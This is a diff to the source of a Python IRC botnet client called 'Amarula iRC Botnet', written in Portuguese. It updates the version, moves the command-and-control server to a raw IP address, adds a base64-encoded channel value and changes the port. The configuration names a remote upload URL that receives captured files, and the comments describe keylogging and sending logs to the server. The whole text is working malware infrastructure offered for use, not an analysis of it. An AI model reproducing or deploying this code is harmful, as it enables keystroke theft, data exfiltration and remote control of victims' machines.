@@ -2,17 +2,16 @@
 # -*-coding:utf-8-*-
 # coder: _carlosnericorreia_(badfly)
 # email: hackerama@protonmail.com
-# Amarula iRC Botnet v2.1 - Panama Version
+# Amarula iRC Botnet v2.3 - Cheesebread Version
 
 
 
 #######################################################################################################################
 #                                                                                                                     #
 # -----------------------------------[+] A M A R U L A    I R C    B O T N E T [+] -----------------------------------#
-#                                                  Panama Version                                                   #
+#                                                  Cheesebread Version                                                   #
 #                                                                                                                     #
 #######################################################################################################################
-
 import glob                                       # Funcao listArq()
 import multiprocessing                            # funcao main(), keylog()
 import os                                         # Funcoes deleteFile(), listArq(), upload(),
@@ -35,24 +34,25 @@ from multiprocessing.forking import freeze_support
 #                                              C O N F I G U R A C O E S                                              #
 # --------------------------------------------------------------------------------------------------------------------#
 
-ircServer= "irc.underworld.no"                             # Endereco do servidor IRC.
-ircChannel= "#amarula424217"                                  # Canal ao qual o Zumbi ira se conectar.
-channelPwd= ""                                   # Password do canal, caso nao haja, deixar em branco.
-masterName= "Papa Father"                                     # Nome que os Zumbis usarao para chamar voce (n. obrigatorio)
-botPass= "raise"                                           # Password para se conectar aos bots no canal
-urlUpload = "http://cardinal-restaurant.000webhostapp.com/upload.php"                # Array PHP que ira receber os arquivos via upload
-urlStrip = urlUpload.strip('http:upload.php')              # Exibe a URL do dos arquivos upados
-ldir = os.getcwd()+'\storage'                                      # Pasta onde sera salvo o arquivo de log local no cliente
-window = None                                              # Funcao onKey(event) para capturar o nome da janela
-data = ''                                                  # Funcao onKey(event) para tratar os dados capturados
-head = ''                                                  # Para definir o cabecalho da janela capturada no log.txt
-dump = []                                                  # Contador de caracteres, com 100 sobe o log pro Server
-date = time.strftime("%d/%m/%Y")+' - '+time.strftime("%X") # Data e hora no cabecalho de janelo no log.txt
-pcname = platform.node()                                   # Nome do PC
-pcos = platform.platform()                                 # Nome do OS
-pcprocess = platform.processor()                           # Descricao do Processador
-fileup = ldir + '\capt-' + pcname + '.txt'                 # Auxiliar da funcao upload2(fileup)
-botNick = pcname + "-" + str(random.randint(1, 10000))     # Nick do bot no IRC
+ircServer= "54.165.54.158" #"irc.underworld.no"                         # Endereco do servidor IRC.
+ircChannel= "#amarula424217"                                 		# Canal ao qual o Zumbi ira se conectar.
+crlChannel= "I3BhcmFub2lkYW5kcm9pZA=="                                  # beta feature, não mexa =D
+channelPwd= ""                                   			# Password do canal, caso nao haja, deixar em branco.
+masterName= "Papa Father"                                     		# Nome que os Zumbis usarao para chamar voce
+botPass= "raise"                                           		# Password para se conectar aos bots no canal
+urlUpload = "http://cardinal-restaurant.000webhostapp.com/upload.php"   # Array PHP que ira receber os arquivos via upload
+urlStrip = urlUpload.strip('http:upload.php')              		# Exibe a URL do dos arquivos upados
+ldir = os.getcwd()+'\storage'                                      	# Pasta onde sera salvo o arquivo de log local no cliente
+window = None                                              		# Funcao onKey(event) para capturar o nome da janela
+data = ''                                                  		# Funcao onKey(event) para tratar os dados capturados
+head = ''                                                  		# Para definir o cabecalho da janela capturada no log.txt
+dump = []                                                  		# Contador de caracteres, com 100 sobe o log pro Server
+date = time.strftime("%d/%m/%Y")+' - '+time.strftime("%X") 		# Data e hora no cabecalho de janelo no log.txt
+pcname = platform.node()                                   		# Nome do PC
+pcos = platform.platform()                                 		# Nome do OS
+ipcprocess = platform.processor()                           		# Descricao do Processador
+fileup = ldir + '\capt-' + pcname + '.txt'                 		# Auxiliar da funcao upload2(fileup)
+botNick = pcname + "-" + str(random.randint(1, 10000))     		# Nick do bot no IRC
 list_of_sockets = []
 user_agents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
@@ -90,7 +90,7 @@ def conn():
     # Inicia a conexao com o IRC
 
     try:
-        ircSock.connect((ircServer, 6665)) #6667
+        ircSock.connect((ircServer, 6667)) #6665
     except socket.error:
         conn()
     else:
@@ -418,8 +418,8 @@ def main():
     global masterName, ldir, comando, ircSock, botNick, fileUp, urlDown, fileRun, interval, delFile, outt, out2, out3
     ircSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     #time.sleep(40) # Esperar a inicializacao do network card (uncomment to use)
-
     conn()
+    time.sleep(8)
     join(ircChannel)
     login = False
 
